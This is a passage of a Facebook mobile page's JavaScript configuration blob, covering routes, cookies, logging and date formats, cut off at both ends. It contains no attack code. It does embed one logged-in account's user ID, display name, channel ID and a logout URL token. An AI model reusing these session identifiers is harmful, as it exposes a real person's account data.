\/lsr.php":1,"\/ajax\/dtsg\/":1,"\/checkpoint\/block\/":1,"\/exitdsite":1,"\/zero\/balance\/pixel\/":1,"\/zero\/balance\/":1,"\/zero\/balance\/carrier_landing\/":1,"\/tr":1,"\/tr\/":1,"\/sem_campaigns\/sem_pixel_test\/":1,"\/bookmarks\/flyout\/body\/":1,"\/zero\/subno\/":1,"\/confirmemail.php":1,"\/policies\/":1,"\/mobile\/internetdotorg\/classifier":1,"\/4oh4.php":1,"\/autologin.php":1,"\/birthday_help.php":1,"\/checkpoint\/":1,"\/contact-importer\/":1,"\/cr.php":1,"\/legal\/terms\/":1,"\/login.php":1,"\/login\/":1,"\/mobile\/account\/":1,"\/n\/":1,"\/remote_test_device\/":1,"\/upsell\/buy\/":1,"\/upsell\/buyconfirm\/":1,"\/upsell\/buyresult\/":1,"\/upsell\/promos\/":1,"\/upsell\/continue\/":1,"\/upsell\/h\/promos\/":1,"\/upsell\/loan\/learnmore\/":1,"\/upsell\/purchase\/":1,"\/upsell\/promos\/upgrade\/":1,"\/upsell\/buy_redirect\/":1,"\/upsell\/loan\/buyconfirm\/":1,"\/upsell\/loan\/buy\/":1,"\/upsell\/sms\/":1,"\/wap\/a\/channel\/reconnect.php":1,"\/wap\/a\/nux\/wizard\/nav.php":1,"\/wap\/appreg.php":1,"\/wap\/birthday_help.php":1,"\/wap\/c.php":1,"\/wap\/confirmemail.php":1,"\/wap\/cr.php":1,"\/wap\/login.php":1,"\/wap\/r.php":1,"\/zero\/datapolicy":1,"\/a\/timezone.php":1,"\/a\/bz":1,"\/bz\/reliability":1,"\/r.php":1,"\/mr\/":1,"\/reg\/":1,"\/registration\/log\/":1,"\/terms\/":1,"\/f123\/":1,"\/expert\/":1,"\/experts\/":1,"\/terms\/index.php":1,"\/terms.php":1,"\/srr\/":1,"\/msite\/redirect\/":1,"\/fbs\/pixel\/":1,"\/contactpoint\/preconfirmation\/":1,"\/contactpoint\/cliff\/":1,"\/contactpoint\/confirm\/submit\/":1,"\/contactpoint\/confirmed\/":1,"\/contactpoint\/login\/":1,"\/preconfirmation\/contactpoint_change\/":1,"\/help\/contact\/":1,"\/survey\/":1,"\/upsell\/loyaltytopup\/accept\/":1,"\/settings\/":1}},1478],["ZeroCategoryHeader",[],\{},1127],["CurrentCommunityInitialData",[],\{},490],["BootloaderConfig",[],{"jsRetries":null,"jsRetryAbortNum":2,"jsRetryAbortTime":5,"payloadEndpointURI":"https:\/\/touch.facebook.com\/ajax\/haste-response\/","assumeNotNonblocking":false,"assumePermanent":true,"skipEndpoint":true},329],["CSSLoaderConfig",[],{"timeout":5000,"modulePrefix":"BLCSS:","loadEventSupported":true},619],["CurrentUserInitialData",[],{"USER_ID":"100024870700996","ACCOUNT_ID":"100024870700996","NAME":"Brutix Fsec","SHORT_NAME":"Brutix","IS_MESSENGER_ONLY_USER":false,"IS_DEACTIVATED_ALLOWED_ON_MESSENGER":false},270],["ISB",[],\{},330],["LSD",[],\{},323],["SiteData",[],{"server_revision":3963560,"client_revision":3963560,"tier":"","push_phase":"C3","pkg_cohort":"FW_EXP:mtouch_pkg","pkg_cohort_key":"__pc","haste_site":"mobile","be_mode":-1,"be_key":"__be","is_rtl":false,"vip":"157.240.9.18"},317],["SprinkleConfig",[],{"param_name":"jazoest"},2111],["ErrorSignalConfig",[],{"uri":"https:\/\/error.facebook.com\/common\/scribe_endpoint.php"},319],["MSession",[],{"useAngora":false,"logoutURL":"\/logout.php?h=AfdUd4vZpexkdP59&t=1527876312","push_phase":"C3"},52],["ArtilleryComponentSaverOptions",[],{"options":{"ads_wait_time_saver":{"shouldCompress":false,"shouldUploadSeparately":false},"ads_flux_profiler_saver":{"shouldCompress":true,"shouldUploadSeparately":false},"timeslice_execution_saver":{"shouldCompress":true,"shouldUploadSeparately":false},"interaction_async_request_join_data":{"shouldCompress":true,"shouldUploadSeparately":true},"resources_saver":{"shouldCompress":true,"shouldUploadSeparately":false},"user_timing_saver":{"shouldCompress":false,"shouldUploadSeparately":false}}},3016],["TimeSliceInteractionSV",[],{"on_demand_reference_counting":true,"on_demand_profiling_counters":true,"default_rate":1000,"lite_default_rate":100,"interaction_to_lite_coinflip":{"ADS_INTERFACES_INTERACTION":0,"ads_perf_scenario":0,"ads_wait_time":0,"Event":10,"video_psr":0,"video_stall":0},"interaction_to_coinflip":{"ADS_INTERFACES_INTERACTION":1,"ads_perf_scenario":1,"ads_wait_time":1,"video_psr":1000000,"video_stall":2500000,"Event":500,"watch_carousel_left_scroll":1,"watch_carousel_right_scroll":1,"watch_sections_load_more":1,"watch_discover_scroll":1,"fbpkg_ui":1,"backbone_ui":1},"enable_heartbeat":true,"maxBlockMergeDuration":0,"maxBlockMergeDistance":0,"enable_banzai_stream":true,"user_timing_coinflip":50,"banzai_stream_coinflip":1,"compression_enabled":true,"ref_counting_fix":true,"ref_counting_cont_fix":false,"also_record_new_timeslice_format":false,"force_async_request_tracing_on":false},2609],["MRenderingSchedulerConfig",[],{"delayNormalResources":true,"isDisplayJSEnabled":false},1978],["CookieCoreConfig",[],{"a11y":\{},"act":\{},"c_user":\{},"ddid":{"p":"\/deferreddeeplink\/","t":2419200},"dpr":{"t":604800},"js_ver":{"t":604800},"locale":{"t":604800},"lh":{"t":604800},"m_pixel_ratio":{"t":604800},"noscript":\{},"pnl_data2":{"t":2},"presence":\{},"rdir":\{},"sW":\{},"sfau":\{},"wd":{"t":604800},"x-referer":\{},"x-src":{"t":1}},2104],["CookieCoreLoggingConfig",[],{"maximumIgnorableStallMs":16.67,"sampleRate":9.7e-5},3401],["SessionNameConfig",[],{"seed":"0wWe"},757],["BigPipeExperiments",[],{"link_images_to_pagelets":false},907],["FbtLogger",[],{"logger":null},288],["IntlNumberTypeConfig",[],{"impl":"if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"},3405],["FbtResultGK",[],{"shouldReturnFbtResult":true,"inlineMode":"NO_INLINE"},876],["IntlHoldoutGK",[],{"inIntlHoldout":false},2827],["IntlViewerContext",[],{"GENDER":1},772],["NumberFormatConfig",[],{"decimalSeparator":".","numberDelimiter":",","minDigitsForThousandsSeparator":4,"standardDecimalPatternInfo":{"primaryGroupSize":3,"secondaryGroupSize":3},"numberingSystemData":null},54],["IntlPhonologicalRules",[],{"meta":{"\/_B\/":"([.,!?\\s]|^)","\/_E\/":"([.,!?\\s]|$)"},"patterns":{"\/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)\/":"\u0001$1$2s\u0001$3","\/_\u0001([^\u0001]*)\u0001\/":"javascript"}},1496],["AsyncProfilerWorkerResource",[],{"url":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yq\/r\/L2E1WjzsO7-.js","name":"AsyncProfilerWorkerBundle"},2779],["WebWorkerConfig",[],{"logging":{"enabled":false,"config":"WebWorkerLoggerConfig"},"evalWorkerURL":"\/rsrc.php\/v3\/yK\/r\/pcnyCVb0ZCt.js"},297],["FWLoader",[],\{},278],["MPageControllerGating",[],{"shouldDeferUntilCertainNoRedirect":false},2023],["CLDRDateRenderingClientRollout",[],{"formatDateClientLoggerSamplingRate":0.0001},3003],["DateFormatConfig",[],{"numericDateOrder":["m","d","y"],"numericDateSeparator":"\/","shortDayNames":["Mon","Tue","Wed","Thu","Fri","Sat","Sun"],"timeSeparator":":","weekStart":6,"formats":{"D":"D","D g:ia":"D g:ia","D M d":"D M d","D M d, Y":"D M d, Y","D M j":"D M j","D M j, g:ia":"D M j, g:ia","D M j, y":"D M j, y","D M j, Y g:ia":"D M j, Y g:ia","D, M j, Y":"D, M j, Y","F d":"F d","F d, Y":"F d, Y","F g":"F g","F j":"F j","F j, Y":"F j, Y","F j, Y \u0040 g:i A":"F j, Y \u0040 g:i A","F j, Y g:i a":"F j, Y g:i a","F jS":"F jS","F jS, g:ia":"F jS, g:ia","F jS, Y":"F jS, Y","F Y":"F Y","g A":"g A","g:i":"g:i","g:i A":"g:i A","g:i a":"g:i a","g:iA":"g:iA","g:ia":"g:ia","g:ia F jS, Y":"g:ia F jS, Y","g:iA l, F jS":"g:iA l, F jS","g:ia M j":"g:ia M j","g:ia M jS":"g:ia M jS","g:ia, F jS":"g:ia, F jS","g:iA, l M jS":"g:iA, l M jS","g:sa":"g:sa","H:I - M d, Y":"H:I - M d, Y","h:i a":"h:i a","h:m:s m\/d\/Y":"h:m:s m\/d\/Y","j":"j","l F d, Y":"l F d, Y","l g:ia":"l g:ia","l, F d, Y":"l, F d, Y","l, F j":"l, F j","l, F j, Y":"l, F j, Y","l, F jS":"l, F jS","l, F jS, g:ia":"l, F jS, g:ia","l, M j":"l, M j","l, M j, Y":"l, M j, Y","l, M j, Y g:ia":"l, M j, Y g:ia","M d":"M d","M d, Y":"M d, Y","M d, Y g:ia":"M d, Y g:ia","M d, Y ga":"M d, Y ga","M j":"M j","M j, Y":"M j, Y","M j, Y g:i A":"M j, Y g:i A","M j, Y g:ia":"M j, Y g:ia","M jS, g:ia":"M jS, g:ia","M Y":"M Y","M y":"M y","m-d-y":"m-d-y","M. d":"M. d","M. d, Y":"M. d, Y","j F Y":"j F Y","m.d.y":"m.d.y","m\/d":"m\/d","m\/d\/Y":"m\/d\/Y","m\/d\/y":"m\/d\/y","m\/d\/Y g:ia":"m\/d\/Y g:ia","m\/d\/y H:i:s":"m\/d\/y H:i:s","m\/d\/Y h:m":"m\/d\/Y h:m","n":"n","n\/j":"n\/j","n\/j, g:ia":"n\/j, g:ia","n\/j\/y":"n\/j\/y","Y":"Y","Y-m-d":"Y-m-d","Y\/m\/d":"Y\/m\/d","y\/m\/d":"y\/m\/d","j \/ F \/ Y":"j \/ F \/ Y"},"ordinalSuffixes":{"1":"st","2":"nd","3":"rd","4":"th","5":"th","6":"th","7":"th","8":"th","9":"th","10":"th","11":"th","12":"th","13":"th","14":"th","15":"th","16":"th","17":"th","18":"th","19":"th","20":"th","21":"st","22":"nd","23":"rd","24":"th","25":"th","26":"th","27":"th","28":"th","29":"th","30":"th","31":"st"}},165],["MarauderConfig",[],{"app_version":"3963560","gk_enabled":false},31],["KillabyteProfilerConfig",[],{"htmlProfilerModule":null,"profilerModule":null,"depTypes":{"BL":"bl","NON_BL":"non-bl"}},1145],["ArtilleryExperiments",[],{"artillery_static_resources_pagelet_attribution":false,"artillery_timeslice_compressed_data":false,"artillery_miny_client_payload":false,"artillery_prolong_page_tracing":false,"artillery_navigation_timing_level_2":false,"artillery_profiler_on":false,"artillery_merge_max_distance_sec":1,"artillery_merge_max_duration_sec":1},1237],["QuicklingConfig",[],{"version":"3963560;0;","sessionLength":30,"inactivePageRegex":"^\/(fr\/u\\.php|ads\/|advertising|ac\\.php|ae\\.php|a\\.php|ajax\/emu\/(end|f|h)\\.php|badges\/|comments\\.php|connect\/uiserver\\.php|editalbum\\.php.+add=1|ext\/|feeds\/|help([\/?]|$)|identity_switch\\.php|isconnectivityahumanright\/|intern\/|login\\.php|logout\\.php|sitetour\/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|\/plugins\/subscribe|lookback|brandpermissions|gameday|pxlcld|worldcup\/map|livemap|work\/admin|([^\/]+\/)?dialog)|legal|\\.pdf$","badRequestKeys":["nonce","access_token","oauth_token","xs","checkpoint_data","code"],"logRefreshOverhead":false},60],["LinkshimHandlerConfig",[],{"supports_meta_referrer":true,"default_meta_referrer_policy":"origin-when-crossorigin","switched_meta_referrer_policy":"origin","link_react_default_hash":"ATNs7_Ksel2JKVQTTfXU-_KE8boavuYfbpSB0a8N-dgWfWxv7_6JvGQsZX4SHGx_Yt9HOR_Ew9SY3W7lGZi-TF5JE99qsJeIvkIgpf-6Z6FzVw","untrusted_link_default_hash":"ATPfylpGY2igq7jCeZ7HeTiMwqrPPGRO16STKS0awydygSPoc86Gq-MQpRPMPtn12w9mJZ8AH46fcD8B53IRT2VSNFWCzmt8SRngJBo587KLnA","linkshim_host":"lm.facebook.com","use_rel_no_opener":true,"always_use_https":true,"onion_always_shim":true,"middle_click_requires_event":true,"www_safe_js_mode":"asynclazy","m_safe_js_mode":"MLynx_asynclazy"},27],["ImmediateActiveSecondsConfig",[],{"sampling_rate":2003,"ias_bucket":848},423],["ReactGK",[],{"debugRenderPhaseSideEffects":false,"alwaysUseRequestIdleCallbackPolyfill":true,"fiberAsyncScheduling":false,"unmountOnBeforeClearCanvas":true,"fireGetDerivedStateFromPropsOnStateUpdates":true},998],["CoreWarningGK",[],{"forceWarning":false},725],["MBanzaiConfig",[],{"EXPIRY":86400000,"MAX_SIZE":10000,"MAX_WAIT":30000,"RESTORE_WAIT":30000,"gks":{"boosted_component":true,"mchannel_jumpstart":true,"platform_oauth_client_events":true,"visibility_tracking":true,"boosted_pagelikes":true,"gqls_web_logging":true},"blacklist":["time_spent"]},32],["FbtQTOverrides",[],{"overrides":{"1_43839c1f069957436e65d660aa31e1a0":"Pay no fees on movie tickets"}},551],["EventConfig",[],{"sampling":{"bandwidth":0,"play":0,"playing":0,"progress":0,"pause":0,"ended":0,"seeked":0,"seeking":0,"waiting":0,"loadedmetadata":0,"canplay":0,"selectionchange":0,"change":0,"timeupdate":2000000,"adaptation":0,"focus":0,"blur":0,"load":0,"error":0,"message":0,"abort":0,"storage":0,"scroll":200000,"mousemove":20000,"mouseover":10000,"mouseout":10000,"mousewheel":1,"MSPointerMove":10000,"keydown":0.1,"click":0.02,"mouseup":0.02,"__100ms":0.001,"__default":5000,"__min":100,"__interactionDefault":200,"__eventDefault":100000},"page_sampling_boost":1,"interaction_regexes":{"BlueBarAccountChevronMenu":" _5lxs(?: .*)?$","BlueBarHomeButton":" _bluebarLinkHome__interaction-root(?: .*)?$","BlueBarProfileLink":" _1k67(?: .*)?$","ReactComposerSproutMedia":" _1pnt(?: .*)?$","ReactComposerSproutAlbum":" _1pnu(?: .*)?$","ReactComposerSproutNote":" _3-9x(?: .*)?$","ReactComposerSproutLocation":" _1pnv(?: .*)?$","ReactComposerSproutActivity":" _1pnz(?: .*)?$","ReactComposerSproutPeople":" _1pn-(?: .*)?$","ReactComposerSproutLiveVideo":" _5tv7(?: .*)?$","ReactComposerSproutMarkdown":" _311p(?: .*)?$","ReactComposerSproutFormattedText":" _mwg(?: .*)?$","ReactComposerSproutSticker":" _2vri(?: .*)?$","ReactComposerSproutSponsor":" _5t5q(?: .*)?$","ReactComposerSproutEllipsis":" _1gr3(?: .*)?$","ReactComposerSproutContactYourRepresentative":" _3cnv(?: .*)?$","ReactComposerSproutFunFact":" _2_xs(?: .*)?$","TextExposeSeeMoreLink":" see_more_link(?: .*)?$","SnowliftBigCloseButton":"(?: _xlt(?: .*)? _418x(?: .*)?$| _418x(?: .*)? _xlt(?: .*)?$)","SnowliftPrevPager":"(?: snowliftPager(?: .*)? prev(?: .*)?$| prev(?: .*)? snowliftPager(?: .*)?$)","SnowliftNextPager":"(?: snowliftPager(?: .*)? next(?: .*)?$| next(?: .*)? snowliftPager(?: .*)?$)","SnowliftFullScreenButton":"#fbPhotoSnowliftFullScreenSwitch( .+)*","PrivacySelectorMenu":"(?: _57di(?: .*)? _2wli(?: .*)?$| _2wli(?: .*)? _57di(?: .*)?$)","ReactComposerFeedXSprouts":" _nh6(?: .*)?$","SproutsComposerStatusTab":" _sg1(?: .*)?$","SproutsComposerLiveVideoTab":" _sg1(?: .*)?$","SproutsComposerAlbumTab":" _sg1(?: .*)?$","composerAudienceSelector":" _ej0(?: .*)?$","FeedHScrollAttachmentsPrevPager":" _1qqy(?: .*)?$","FeedHScrollAttachmentsNextPager":" _1qqz(?: .*)?$","DockChatTabFlyout":" fbDockChatTabFlyout(?: .*)?$","PrivacyLiteJewel":" _59fc(?: .*)?$","ActorSelector":" _6vh(?: .*)?$","LegacyMentionsInput":"(?: ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)? _2xwx(?: .*)?$| uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)?$| _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)?$| ReactLegacyMentionsInput(?: .*)? _2xwx(?: .*)? uiMentionsInput(?: .*)?$| uiMentionsInput(?: .*)? _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)?$| _2xwx(?: .*)? uiMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)?$)","UFIActionLinksEmbedLink":" _2g1w(?: .*)?$","UFIPhotoAttachLink":" UFIPhotoAttachLinkWrapper(?: .*)?$","UFIMentionsInputProxy":" _1osa(?: .*)?$","UFIMentionsInputDummy":" _1osc(?: .*)?$","UFIOrderingModeSelector":" _3scp(?: .*)?$","UFIPager":"(?: UFIPagerRow(?: .*)? UFIRow(?: .*)?$| UFIRow(?: .*)? UFIPagerRow(?: .*)?$)","UFIReplyRow":"(?: UFIReplyRow(?: .*)? UFICommentReply(?: .*)?$| UFICommentReply(?: .*)? UFIReplyRow(?: .*)?$)","UFIReplySocialSentence":" UFIReplySocialSentenceRow(?: .*)?$","UFIShareLink":" _5f9b(?: .*)?$","UFIStickerButton":" UFICommentStickerButton(?: .*)?$","MentionsInput":" _5yk1(?: .*)?$","FantaChatTabRoot":" _3_9e(?: .*)?$","SnowliftViewableRoot":" _2-sx(?: .*)?$","ReactBlueBarJewelButton":" _5fwr(?: .*)?$","UFIReactionsDialogLayerImpl":" _1oxk(?: .*)?$","UFIReactionsLikeLinkImpl":" _4x9_(?: .*)?$","UFIReactionsLinkImplRoot":" _khz(?: .*)?$","Reaction":" _iuw(?: .*)?$","UFIReactionsMenuImpl":" _iu-(?: .*)?$","UFIReactionsSpatialReactionIconContainer":" _1fq9(?: .*)?$","VideoComponentPlayButton":" _bsl(?: .*)?$","FeedOptionsPopover":" _b1e(?: .*)?$","UFICommentLikeCount":" UFICommentLikeButton(?: .*)?$","UFICommentLink":" _5yxe(?: .*)?$","ChatTabComposerInputContainer":" _552h(?: .*)?$","ChatTabHeader":" _15p4(?: .*)?$","DraftEditor":" _5rp7(?: .*)?$","ChatSideBarDropDown":" _5vm9(?: .*)?$","SearchBox":" _539-(?: .*)?$","ChatSideBarLink":" _55ln(?: .*)?$","MessengerSearchTypeahead":" _3rh8(?: .*)?$","NotificationListItem":" _33c(?: .*)?$","MessageJewelListItem":" messagesContent(?: .*)?$","Messages_Jewel_Button":" _3eo8(?: .*)?$","Notifications_Jewel_Button":" _3eo9(?: .*)?$","snowliftopen":" _342u(?: .*)?$","NoteTextSeeMoreLink":" _3qd_(?: .*)?$","fbFeedOptionsPopover":" _1he6(?: .*)?$","Requests_Jewel_Button":" _3eoa(?: .*)?$","UFICommentActionLinkAjaxify":" _15-3(?: .*)?$","UFICommentActionLinkRedirect":" _15-6(?: .*)?$","UFICommentActionLinkDispatched":" _15-7(?: .*)?$","UFICommentCloseButton":" _36rj(?: .*)?$","UFICommentActionsRemovePreview":" _460h(?: .*)?$","UFICommentActionsReply":" _460i(?: .*)?$","UFICommentActionsSaleItemMessage":" _460j(?: .*)?$","UFICommentActionsAcceptAnswer":" _460k(?: .*)?$","UFICommentActionsUnacceptAnswer":" _460l(?: .*)?$","UFICommentReactionsLikeLink":" _3-me(?: .*)?$","UFICommentMenu":" _1-be(?: .*)?$","UFIMentionsInputFallback":" _289b(?: .*)?$","UFIMentionsInputComponent":" _289c(?: .*)?$","UFIMentionsInputProxyInput":" _432z(?: .*)?$","UFIMentionsInputProxyDummy":" _432-(?: .*)?$","UFIPrivateReplyLinkMessage":" _14hj(?: .*)?$","UFIPrivateReplyLinkSeeReply":" _14hk(?: .*)?$","ChatCloseButton":" _4vu4(?: .*)?$","ChatTabComposerPhotoUploader":" _13f-(?: .*)?$","ChatTabComposerGroupPollingButton":" _13f_(?: .*)?$","ChatTabComposerGames":" _13ga(?: .*)?$","ChatTabComposerPlan":" _13gb(?: .*)?$","ChatTabComposerFileUploader":" _13gd(?: .*)?$","ChatTabStickersButton":" _13ge(?: .*)?$","ChatTabComposerGifButton":" _13gf(?: .*)?$","ChatTabComposerEmojiPicker":" _13gg(?: .*)?$","ChatTabComposerLikeButton":" _13gi(?: .*)?$","ChatTabComposerP2PButton":" _13gj(?: .*)?$","ChatTabComposerQuickCam":" _13gk(?: .*)?$","ChatTabHeaderAudioRTCButton":" _461a(?: .*)?$","ChatTabHeaderVideoRTCButton":" _461b(?: .*)?$","ChatTabHeaderOptionsButton":" _461_(?: .*)?$","ChatTabHeaderAddToThreadButton":" _4620(?: .*)?$","ReactComposerMediaSprout":" _fk5(?: .*)?$","UFIReactionsBlingSocialSentenceComments":" _-56(?: .*)?$","UFIReactionsBlingSocialSentenceSeens":" _2x0l(?: .*)?$","UFIReactionsBlingSocialSentenceShares":" _2x0m(?: .*)?$","UFIReactionsBlingSocialSentenceViews":" _-5c(?: .*)?$","UFIReactionsBlingSocialSentence":" _-5d(?: .*)?$","UFIReactionsSocialSentence":" _1vaq(?: .*)?$","VideoFullscreenButton":" _39ip(?: .*)?$","Tahoe":" _400z(?: .*)?$","TahoeFromVideoPlayer":" _1vek(?: .*)?$","TahoeFromVideoLink":" _2-40(?: .*)?$","TahoeFromPhoto":" _2ju5(?: .*)?$","FBStoryTrayItem":" _1fvw(?: .*)?$","Mobile_Feed_Jewel_Button":"#feed_jewel( .+)*","Mobile_Requests_Jewel_Button":"#requests_jewel( .+)*","Mobile_Messages_Jewel_Button":"#messages_jewel( .+)*","Mobile_Notifications_Jewel_Button":"#notifications_jewel( .+)*","Mobile_Search_Jewel_Button":"#search_jewel( .+)*","Mobile_Bookmarks_Jewel_Button":"#bookmarks_jewel( .+)*","Mobile_Feed_UFI_Comment_Button_Permalink":" _l-a(?: .*)?$","Mobile_Feed_UFI_Comment_Button_Flyout":" _4qeq(?: .*)?$","Mobile_Feed_UFI_Token_Bar_Flyout":" _4qer(?: .*)?$","Mobile_Feed_UFI_Token_Bar_Permalink":" _4-09(?: .*)?$","Mobile_UFI_Share_Button":" _15kr(?: .*)?$","Mobile_Feed_Photo_Permalink":" _1mh-(?: .*)?$","Mobile_Feed_Video_Permalink":" _65g_(?: .*)?$","Mobile_Feed_Profile_Permalink":" _4kk6(?: .*)?$","Mobile_Feed_Story_Permalink":" _26yo(?: .*)?$","Mobile_Feed_Page_Permalink":" _4e81(?: .*)?$","Mobile_Feed_Group_Permalink":" _20u1(?: .*)?$","Mobile_Feed_Event_Permalink":" _20u0(?: .*)?$","ProfileIntroCardAddFeaturedMedia":" _30qr(?: .*)?$","ProfileSectionAbout":" _Interaction__ProfileSectionAbout(?: .*)?$","ProfileSectionAllRelationships":" _Interaction__ProfileSectionAllRelationships(?: .*)?$","ProfileSectionAtWork":" _Interaction__ProfileSectionAtWork(?: .*)?$","ProfileSectionContactBasic":" _Interaction__ProfileSectionContactBasic(?: .*)?$","ProfileSectionEducation":" _Interaction__ProfileSectionEducation(?: .*)?$","ProfileSectionOverview":" _Interaction__ProfileSectionOverview(?: .*)?$","ProfileSectionPlaces":" _Interaction__ProfileSectionPlaces(?: .*)?$","ProfileSectionYearOverviews":" _Interaction__ProfileSectionYearOverviews(?: .*)?$","IntlPolyglotHomepage":" _Interaction__IntlPolyglotVoteActivityCardButton(?: .*)?$","ProtonElementSelection":" _67ft(?: .*)?$"},"interaction_boost":{"SnowliftPrevPager":0.2,"SnowliftNextPager":0.2,"ChatSideBarLink":2,"MessengerSearchTypeahead":2,"Messages_Jewel_Button":2.5,"Notifications_Jewel_Button":1.5,"Tahoe":30,"ProtonElementSelection":4},"event_types":{"BlueBarAccountChevronMenu":["click"],"BlueBarHomeButton":["click"],"BlueBarProfileLink":["click"],"ReactComposerSproutMedia":["click"],"ReactComposerSproutAlbum":["click"],"ReactComposerSproutNote":["click"],"ReactComposerSproutLocation":["click"],"ReactComposerSproutActivity":["click"],"ReactComposerSproutPeople":["click"],"ReactComposerSproutLiveVideo":["click"],"ReactComposerSproutMarkdown":["click"],"ReactComposerSproutFormattedText":["click"],"ReactComposerSproutSticker":["click"],"ReactComposerSproutSponsor":["click"],"ReactComposerSproutEllipsis":["click"],"ReactComposerSproutContactYourRepresentative":["click"],"ReactComposerSproutFunFact":["click"],"TextExposeSeeMoreLink":["click"],"SnowliftBigCloseButton":["click"],"SnowliftPrevPager":["click"],"SnowliftNextPager":["click"],"SnowliftFullScreenButton":["click"],"PrivacySelectorMenu":["click"],"ReactComposerFeedXSprouts":["click"],"SproutsComposerStatusTab":["click"],"SproutsComposerLiveVideoTab":["click"],"SproutsComposerAlbumTab":["click"],"composerAudienceSelector":["click"],"FeedHScrollAttachmentsPrevPager":["click"],"FeedHScrollAttachmentsNextPager":["click"],"DockChatTabFlyout":["click"],"PrivacyLiteJewel":["click"],"ActorSelector":["click"],"LegacyMentionsInput":["click"],"UFIActionLinksEmbedLink":["click"],"UFIPhotoAttachLink":["click"],"UFIMentionsInputProxy":["click"],"UFIMentionsInputDummy":["click"],"UFIOrderingModeSelector":["click"],"UFIPager":["click"],"UFIReplyRow":["click"],"UFIReplySocialSentence":["click"],"UFIShareLink":["click"],"UFIStickerButton":["click"],"MentionsInput":["click"],"FantaChatTabRoot":["click"],"SnowliftViewableRoot":["click"],"ReactBlueBarJewelButton":["click"],"UFIReactionsDialogLayerImpl":["click"],"UFIReactionsLikeLinkImpl":["click"],"UFIReactionsLinkImplRoot":["click"],"Reaction":["click"],"UFIReactionsMenuImpl":["click"],"UFIReactionsSpatialReactionIconContainer":["click"],"VideoComponentPlayButton":["click"],"FeedOptionsPopover":["click"],"UFICommentLikeCount":["click"],"UFICommentLink":["click"],"ChatTabComposerInputContainer":["click"],"ChatTabHeader":["click"],"DraftEditor":["click"],"ChatSideBarDropDown":["click"],"SearchBox":["click"],"ChatSideBarLink":["mouseup"],"MessengerSearchTypeahead":["click"],"NotificationListItem":["click"],"MessageJewelListItem":["click"],"Messages_Jewel_Button":["click"],"Notifications_Jewel_Button":["click"],"snowliftopen":["click"],"NoteTextSeeMoreLink":["click"],"fbFeedOptionsPopover":["click"],"Requests_Jewel_Button":["click"],"UFICommentActionLinkAjaxify":["click"],"UFICommentActionLinkRedirect":["click"],"UFICommentActionLinkDispatched":["click"],"UFICommentCloseButton":["click"],"UFICommentActionsRemovePreview":["click"],"UFICommentActionsReply":["click"],"UFICommentActionsSaleItemMessage":["click"],"UFICommentActionsAcceptAnswer":["click"],"UFICommentActionsUnacceptAnswer":["click"],"UFICommentReactionsLikeLink":["click"],"UFICommentMenu":["click"],"UFIMentionsInputFallback":["click"],"UFIMentionsInputComponent":["click"],"UFIMentionsInputProxyInput":["click"],"UFIMentionsInputProxyDummy":["click"],"UFIPrivateReplyLinkMessage":["click"],"UFIPrivateReplyLinkSeeReply":["click"],"ChatCloseButton":["click"],"ChatTabComposerPhotoUploader":["click"],"ChatTabComposerGroupPollingButton":["click"],"ChatTabComposerGames":["click"],"ChatTabComposerPlan":["click"],"ChatTabComposerFileUploader":["click"],"ChatTabStickersButton":["click"],"ChatTabComposerGifButton":["click"],"ChatTabComposerEmojiPicker":["click"],"ChatTabComposerLikeButton":["click"],"ChatTabComposerP2PButton":["click"],"ChatTabComposerQuickCam":["click"],"ChatTabHeaderAudioRTCButton":["click"],"ChatTabHeaderVideoRTCButton":["click"],"ChatTabHeaderOptionsButton":["click"],"ChatTabHeaderAddToThreadButton":["click"],"ReactComposerMediaSprout":["click"],"UFIReactionsBlingSocialSentenceComments":["click"],"UFIReactionsBlingSocialSentenceSeens":["click"],"UFIReactionsBlingSocialSentenceShares":["click"],"UFIReactionsBlingSocialSentenceViews":["click"],"UFIReactionsBlingSocialSentence":["click"],"UFIReactionsSocialSentence":["click"],"VideoFullscreenButton":["click"],"Tahoe":["click"],"TahoeFromVideoPlayer":["click"],"TahoeFromVideoLink":["click"],"TahoeFromPhoto":["click"],"":["click"],"FBStoryTrayItem":["click"],"Mobile_Feed_Jewel_Button":["click"],"Mobile_Requests_Jewel_Button":["click"],"Mobile_Messages_Jewel_Button":["click"],"Mobile_Notifications_Jewel_Button":["click"],"Mobile_Search_Jewel_Button":["click"],"Mobile_Bookmarks_Jewel_Button":["click"],"Mobile_Feed_UFI_Comment_Button_Permalink":["click"],"Mobile_Feed_UFI_Comment_Button_Flyout":["click"],"Mobile_Feed_UFI_Token_Bar_Flyout":["click"],"Mobile_Feed_UFI_Token_Bar_Permalink":["click"],"Mobile_UFI_Share_Button":["click"],"Mobile_Feed_Photo_Permalink":["click"],"Mobile_Feed_Video_Permalink":["click"],"Mobile_Feed_Profile_Permalink":["click"],"Mobile_Feed_Story_Permalink":["click"],"Mobile_Feed_Page_Permalink":["click"],"Mobile_Feed_Group_Permalink":["click"],"Mobile_Feed_Event_Permalink":["click"],"ProfileIntroCardAddFeaturedMedia":["click"],"ProfileSectionAbout":["click"],"ProfileSectionAllRelationships":["click"],"ProfileSectionAtWork":["click"],"ProfileSectionContactBasic":["click"],"ProfileSectionEducation":["click"],"ProfileSectionOverview":["click"],"ProfileSectionPlaces":["click"],"ProfileSectionYearOverviews":["click"],"IntlPolyglotHomepage":["click"],"ProtonElementSelection":["click"]},"manual_instrumentation":false,"profile_eager_execution":true,"disable_heuristic":true,"disable_event_profiler":false},1726],["ChannelClientConfig",[],{"config":{"IFRAME_LOAD_TIMEOUT":30000,"P_TIMEOUT":30000,"STREAMING_TIMEOUT":70000,"PROBE_HEARTBEATS_INTERVAL_LOW":1000,"PROBE_HEARTBEATS_INTERVAL_HIGH":3000,"MTOUCH_SEND_CLIENT_ID":1},"info":{"user_channel":"p_100024870700996","seq":0,"retry_interval":0,"max_conn":6,"ping_to_pull_reconnect_ratio":0.5,"config_refresh_seconds":1200,"shutdown_recovery_interval_seconds":30,"fantail_queue_capacity":100,"proxy_down_delay_millis":600000,"s